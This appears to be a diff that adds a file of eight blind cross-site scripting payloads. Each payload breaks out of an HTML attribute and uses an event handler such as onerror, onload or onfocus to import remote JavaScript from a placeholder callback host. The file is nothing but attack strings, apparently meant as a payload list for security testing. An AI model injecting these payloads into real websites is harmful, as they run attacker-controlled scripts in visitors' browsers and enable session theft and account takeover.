@@ -1,0 +1,8 @@
+"><img src=x onerror=import('https://CALLBACK')>
+"><svg onload=import('https://CALLBACK')>
+"><body onpageshow=import('https://CALLBACK')>
+"><input autofocus onfocus="import('https://CALLBACK')">
+"><details open ontoggle=import('https://CALLBACK')>
+"><video src=x onerror=import('https://CALLBACK')>
+"><audio src=x onerror=import('https://CALLBACK')>
+"><iframe onload=import('https://CALLBACK')>
